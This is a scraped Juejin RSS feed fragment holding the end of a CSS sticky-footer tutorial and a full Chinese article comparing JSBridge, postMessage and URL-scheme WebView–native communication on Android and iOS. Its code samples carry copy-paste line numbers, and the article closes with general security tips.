            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">text-align</span>: center;
        }


        <span class="hljs-comment">/* 中间内容区：关键点！ */</span>
        <span class="hljs-selector-tag">main</span> {
            <span class="hljs-comment">/* flex: 1 让它自动伸缩，占据除去 Header 和 Footer 之外的所有剩余空间 */</span>
            <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>; 
            
            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f0f0f0</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
        }


        <span class="hljs-comment">/* 底部 Footer */</span>
        <span class="hljs-selector-tag">footer</span> {
            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#70b62c</span>; <span class="hljs-comment">/* 品牌绿 */</span>
            <span class="hljs-attribute">color</span>: white;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">text-align</span>: center;
        }
        
        <span class="hljs-comment">/* === [核心布局代码 End] === */</span>


        <span class="hljs-comment">/* 仅用于演示的按钮样式 */</span>
        <span class="hljs-selector-tag">button</span> { <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">20px</span>; <span class="hljs-attribute">cursor</span>: pointer; <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>; <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;}
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>


    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"app-container"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span>
            我是 Header
        <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>


        <span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"content"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>我是主要内容区域<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>当前内容较少，你看 Footer 依然在最底部，没有浮上来。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>你可以点击下面按钮增加内容测试：<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"addContent()"</span>&gt;</span>增加内容（模拟长页面）<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"resetContent()"</span>&gt;</span>重置内容（模拟短页面）<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"extra-text"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>


        <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span>
            我是 Footer (Sticky Layout)
            <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
            无论内容多少，我都在底部
        <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>


    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">addContent</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'extra-text'</span>);
            <span class="hljs-keyword">let</span> html = <span class="hljs-string">''</span>;
            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">20</span>; i++) {
                html += <span class="hljs-string">'&lt;p&gt;这是一段很长的测试内容，用来撑开页面高度... '</span> + i + <span class="hljs-string">'&lt;/p&gt;'</span>;
            }
            div.<span class="hljs-property">innerHTML</span> = html;
        }
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">resetContent</span>(<span class="hljs-params"/>) {
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'extra-text'</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">''</span>;
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>Plain Text</p>
<h3 data-id="heading-4">4. 为什么不用  position: fixed ?</h3>
<p>很多初学者会把 Footer 设为  position: fixed; bottom: 0; 。</p>
<ul>
<li><strong>缺点</strong>：这是<strong>固定定位</strong>。Footer 会永远悬浮在屏幕下方，像贴了一块膏药。如果页面内容很长，内容会被这块膏药挡住，导致最底下的文字看不见。</li>
</ul>

<ul>
<li><strong>Sticky Footer 优点</strong>：它是<strong>流式布局</strong>。内容短时它在底部；内容长时，它在内容的下面，不会遮挡任何信息。</li>
</ul>
<hr/>
<p>一句话总结：</p>
<p>容器 min-height: 100vh + Flex 布局，配合内容区 flex: 1，是目前实现 Sticky Footer 最标准、兼容性最好的方案。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[jsbridge、postMessage、scheme三种通信方式的区别和安卓ios实现方式]]></title>    <link>https://juejin.cn/post/7594383365418483758</link>    <guid>https://juejin.cn/post/7594383365418483758</guid>    <pubDate>2026-01-13T02:32:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594383365418483758" data-draft-id="7594383365418434606" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="jsbridge、postMessage、scheme三种通信方式的区别和安卓ios实现方式"/> <meta itemprop="keywords" content="WebView"/> <meta itemprop="datePublished" content="2026-01-13T02:32:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="菜菜OvO"/> <meta itemprop="url" content="https://juejin.cn/user/2509555820920986"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            jsbridge、postMessage、scheme三种通信方式的区别和安卓ios实现方式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2509555820920986/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    菜菜OvO
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:32:59.000Z" title="Tue Jan 13 2026 02:32:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在混合开发（Hybrid App）中，<strong>Web 与 Native（Android/iOS）之间的通信</strong>是核心需求。常见的三种通信方式是：</p>
<ol>
<li><strong>JSBridge（基于 <code>addJavascriptInterface</code> / <code>WKScriptMessageHandler</code>）</strong></li>
<li><strong><code>postMessage</code> + <code>MessageChannel</code>（现代 WebView 通信）</strong></li>
<li><strong>URL Scheme（拦截自定义协议）</strong></li>
</ol>
<p>下面从 <strong>原理、区别、安全性、平台实现</strong> 等维度详细对比，并给出 Android 和 iOS 的实现方式。</p>
<hr/>
<h2 data-id="heading-0">一、三种方式概览对比</h2>















































<table><thead><tr><th>特性</th><th>JSBridge</th><th>postMessage（MessageChannel）</th><th>URL Scheme</th></tr></thead><tbody><tr><td><strong>通信方向</strong></td><td>双向（JS → Native，Native → JS）</td><td>双向（更标准）</td><td>主要 JS → Native</td></tr><tr><td><strong>实时性</strong></td><td>高</td><td>高（异步消息通道）</td><td>中（依赖页面跳转/iframe）</td></tr><tr><td><strong>安全性</strong></td><td>中（需谨慎暴露接口）</td><td>高（沙箱隔离）</td><td>低（易被中间人劫持）</td></tr><tr><td><strong>兼容性</strong></td><td>Android ≥ API 17；iOS ≥ WKWebView</td><td>Android ≥ 6.0（API 23）；iOS ≥ WKWebView</td><td>全平台支持</td></tr><tr><td><strong>实现复杂度</strong></td><td>中</td><td>中高</td><td>低</td></tr><tr><td><strong>是否推荐</strong></td><td>✅ 常用（但注意安全）</td><td>✅✅ 推荐（现代方案）</td><td>⚠️ 仅用于简单场景</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-1">二、详细说明与实现</h2>
<h3 data-id="heading-2">1. JSBridge（传统桥接）</h3>
<h4 data-id="heading-3">✅ 原理：</h4>
<ul>
<li><strong>Android</strong>：通过 <code>WebView.addJavascriptInterface()</code> 注入 Java 对象。</li>
<li><strong>iOS</strong>：通过 <code>WKWebView.configuration.userContentController.add(_:name:)</code> 注册消息处理器。</li>
</ul>
<h4 data-id="heading-4">🔐 安全要求：</h4>
<ul>
<li>Android 必须加 <code>@JavascriptInterface</code></li>
<li>iOS 需验证来源（如域名白名单）</li>
</ul>
<h4 data-id="heading-5">📱 Android 实现：</h4>
<pre><code class="hljs language-typescript" lang="typescript">java
编辑
<span class="hljs-number">1</span><span class="hljs-comment">// Java</span>
2<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Bridge</span> {
<span class="hljs-number">3</span>    <span class="hljs-meta">@JavascriptInterface</span>
<span class="hljs-number">4</span>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">callNative</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> data</span>) {
<span class="hljs-number">5</span>        <span class="hljs-comment">// 处理 JS 调用</span>
<span class="hljs-number">6</span>    }
<span class="hljs-number">7</span>}
8webView.<span class="hljs-title function_">addJavascriptInterface</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Bridge</span>(), <span class="hljs-string">"Android"</span>);
</code></pre>
<pre><code class="hljs language-arduino" lang="arduino">javascript
编辑
<span class="hljs-number">1</span><span class="hljs-comment">// JS</span>
<span class="hljs-number">2</span>Android.<span class="hljs-built_in">callNative</span>(<span class="hljs-string">"hello"</span>);
</code></pre>
<h4 data-id="heading-6">🍏 iOS 实现（Swift）：</h4>
<pre><code class="hljs language-swift" lang="swift">swift
编辑
<span class="hljs-number">1</span><span class="hljs-comment">// Swift</span>
2class <span class="hljs-type">BridgeHandler</span>: <span class="hljs-type">NSObject</span>, <span class="hljs-type">WKScriptMessageHandler</span> {
<span class="hljs-number">3</span>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">userContentController</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">controller</span>: <span class="hljs-type">WKUserContentController</span>, <span class="hljs-params">didReceive</span> <span class="hljs-params">message</span>: <span class="hljs-type">WKScriptMessage</span>) {
<span class="hljs-number">4</span>        <span class="hljs-keyword">if</span> message.name <span class="hljs-operator">==</span> <span class="hljs-string">"iosBridge"</span> {
<span class="hljs-number">5</span>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"收到 JS 消息:"</span>, message.body)
<span class="hljs-number">6</span>        }
<span class="hljs-number">7</span>    }
<span class="hljs-number">8</span>}
<span class="hljs-number">9</span>
10let config <span class="hljs-operator">=</span> <span class="hljs-type">WKWebViewConfiguration</span>()
11config.userContentController.add(<span class="hljs-type">BridgeHandler</span>(), name: <span class="hljs-string">"iosBridge"</span>)
12let webView <span class="hljs-operator">=</span> <span class="hljs-type">WKWebView</span>(frame: .zero, configuration: config)
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript">javascript
编辑
<span class="hljs-number">1</span><span class="hljs-comment">// JS</span>
2<span class="hljs-variable language_">window</span>.<span class="hljs-property">webkit</span>.<span class="hljs-property">messageHandlers</span>.<span class="hljs-property">iosBridge</span>.<span class="hljs-title function_">postMessage</span>(<span class="hljs-string">"hello"</span>);
</code></pre>
<blockquote>
<p>✅ 优点：简单直接，广泛使用<br/>
❌ 缺点：Android 旧版本有安全漏洞；iOS 无法直接返回值（需回调）</p>
</blockquote>
<hr/>
<h3 data-id="heading-7">2. <code>postMessage</code> + <code>MessageChannel</code>（现代通信）</h3>
<h4 data-id="heading-8">✅ 原理：</h4>
<p>利用 HTML5 的 <code>MessageChannel</code> 创建一个<strong>双向、异步、隔离的消息通道</strong>，Native 作为另一端接收端口。</p>
<blockquote>
<p>这是 Chrome 团队推荐的 WebView 通信方式，安全性高。</p>
</blockquote>
<h4 data-id="heading-9">📱 Android 实现（API ≥ 23）：</h4>
<pre><code class="hljs language-ini" lang="ini">java
编辑
1webView.evaluateJavascript("(function() {" +
2    "const <span class="hljs-attr">channel</span> = new MessageChannel()<span class="hljs-comment">;" +</span>
3    "<span class="hljs-attr">channel.port1.onmessage</span> = function(e) { console.log(<span class="hljs-string">'Reply:'</span>, e.data)<span class="hljs-comment">; };" +</span>
4    "<span class="hljs-attr">window.nativePort</span> = channel.port2<span class="hljs-comment">;" +</span>
5    "})()", null)<span class="hljs-comment">;</span>
6
7// Native 发送消息到 JS
8webView.postWebMessage(
9    new WebMessageCompat("Hello from Android", new WebMessagePortCompat<span class="hljs-section">[]</span>{port}),
10    Uri.parse("https://your-trusted-domain.com")
11)<span class="hljs-comment">;</span>
</code></pre>
<blockquote>
<p>注意：需配合 <code>WebMessageListener</code>（AndroidX）或 <code>postWebMessage</code> 使用。</p>
</blockquote>
<h4 data-id="heading-10">🍏 iOS 实现（WKWebView）：</h4>
<p>iOS 的 <code>WKScriptMessageHandler</code> 本身不直接支持 <code>MessageChannel</code>，但可通过 JS 端模拟双向通信，或使用 <code>evaluateJavaScript</code> 返回结果。</p>
<blockquote>
<p>目前 <strong>Android 对 <code>MessageChannel</code> 原生支持更好</strong>，iOS 仍以 <code>messageHandlers</code> 为主。</p>
</blockquote>
<blockquote>
<p>✅ 优点：安全、标准、支持流式通信<br/>
❌ 缺点：兼容性较差（Android &lt; 6.0 不支持）</p>
</blockquote>
<hr/>
<h3 data-id="heading-11">3. URL Scheme（拦截跳转）</h3>
<h4 data-id="heading-12">✅ 原理：</h4>
<p>JS 通过 <code>location.href = "myapp://action?param=xxx"</code> 触发页面跳转，Native 拦截该 URL 并解析。</p>
<h4 data-id="heading-13">📱 Android 实现：</h4>
<pre><code class="hljs language-typescript" lang="typescript">java
编辑
1webView.<span class="hljs-title function_">setWebViewClient</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebViewClient</span>() {
<span class="hljs-number">2</span>    <span class="hljs-meta">@Override</span>
<span class="hljs-number">3</span>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">shouldOverrideUrlLoading</span>(<span class="hljs-params">WebView view, <span class="hljs-built_in">String</span> url</span>) {
<span class="hljs-number">4</span>        <span class="hljs-keyword">if</span> (url.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"myapp://"</span>)) {
<span class="hljs-number">5</span>            <span class="hljs-comment">// 解析参数并处理</span>
<span class="hljs-number">6</span>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 拦截，不加载</span>
<span class="hljs-number">7</span>        }
<span class="hljs-number">8</span>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
<span class="hljs-number">9</span>    }
<span class="hljs-number">10</span>});
</code></pre>
<h4 data-id="heading-14">🍏 iOS 实现：</h4>
<pre><code class="hljs language-swift" lang="swift">swift
编辑
1<span class="hljs-keyword">func</span> <span class="hljs-title function_">webView</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">webView</span>: <span class="hljs-type">WKWebView</span>, <span class="hljs-params">decidePolicyFor</span> <span class="hljs-params">navigationAction</span>: <span class="hljs-type">WKNavigationAction</span>, <span class="hljs-params">decisionHandler</span>: <span class="hljs-keyword">@escaping</span> (<span class="hljs-type">WKNavigationActionPolicy</span>) -&gt; <span class="hljs-type">Void</span>) {
<span class="hljs-number">2</span>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> url <span class="hljs-operator">=</span> navigationAction.request.url,
<span class="hljs-number">3</span>       url.scheme <span class="hljs-operator">==</span> <span class="hljs-string">"myapp"</span> {
<span class="hljs-number">4</span>        <span class="hljs-comment">// 处理自定义协议</span>
<span class="hljs-number">5</span>        decisionHandler(.cancel) <span class="hljs-comment">// 拦截</span>
<span class="hljs-number">6</span>        <span class="hljs-keyword">return</span>
<span class="hljs-number">7</span>    }
<span class="hljs-number">8</span>    decisionHandler(.allow)
<span class="hljs-number">9</span>}
</code></pre>
<h4 data-id="heading-15">💡 技巧：避免页面跳转闪烁</h4>
<ul>
<li>
<p>使用隐藏的 <code>&lt;iframe&gt;</code> 触发：</p>
<pre><code class="hljs language-ini" lang="ini">javascript
编辑
1const <span class="hljs-attr">iframe</span> = document.createElement(<span class="hljs-string">'iframe'</span>)<span class="hljs-comment">;</span>
<span class="hljs-attr">2iframe.src</span> = <span class="hljs-string">'myapp://call?data=xxx'</span><span class="hljs-comment">;</span>
<span class="hljs-attr">3iframe.style.display</span> = <span class="hljs-string">'none'</span><span class="hljs-comment">;</span>
4document.body.appendChild(iframe)<span class="hljs-comment">;</span>
5setTimeout(() =&gt; document.body.removeChild(iframe), 100)<span class="hljs-comment">;</span>
</code></pre>
</li>
</ul>
<blockquote>
<p>✅ 优点：兼容性极好（所有 WebView 支持）<br/>
❌ 缺点：</p>
<ul>
<li>无法直接返回值（需 JS 再调一次）</li>
<li>URL 长度有限（~2000 字符）</li>
<li>安全性差（可能被第三方页面伪造调用）</li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-16">三、如何选择？</h2>





























<table><thead><tr><th>场景</th><th>推荐方案</th></tr></thead><tbody><tr><td><strong>现代 App（Android ≥ 6.0，iOS ≥ 9）</strong></td><td>✅ <strong>JSBridge + 安全校验</strong> 或 <strong>postMessage（Android 优先）</strong></td></tr><tr><td><strong>需要高安全性（如金融类）</strong></td><td>✅ <code>postMessage</code> + 域名白名单 + HTTPS</td></tr><tr><td><strong>兼容老旧设备</strong></td><td>⚠️ URL Scheme（但需加密参数、校验来源）</td></tr><tr><td><strong>频繁双向通信（如聊天、实时数据）</strong></td><td>✅ JSBridge + 回调机制 或 MessageChannel</td></tr><tr><td><strong>仅简单通知（如分享、埋点）</strong></td><td>✅ URL Scheme 足够</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-17">四、最佳实践建议</h2>
<ol>
<li><strong>永远启用 HTTPS</strong>，防止中间人注入恶意 JS。</li>
<li><strong>验证 WebView 加载的域名</strong>（白名单），避免第三方页面调用你的 Native 接口。</li>
<li><strong>不要在 JSBridge 中暴露敏感操作</strong>（如读取文件、获取 token）。</li>
<li><strong>对 URL Scheme 参数做签名或加密</strong>，防止伪造。</li>
<li><strong>优先使用 <code>WKWebView</code>（iOS）和 <code>AndroidX WebView</code>（Android）</strong> ，避免使用过时的 <code>UIWebView</code> 或系统 WebView。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[手写符合A+规范的Promise]]></title>    <link>https://juejin.cn/post/7594350054091685930</link>    <guid>https://juejin.cn/post/7594350054091685930</guid>    <pubDate>2026-01-13T02:28:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594350054091685930" data-draft-id="7594322573453361195" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="手写符合A+规范的Promise"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-13T02:28:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wuhen_n"/> <meta itemprop="url" content="https://juejin.cn/user/4149996261738233"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            手写符合A+规范的Promise
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4149996261738233/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wuhen_n
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:28:26.000Z" title="Tue Jan 13 2026 02:28:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid 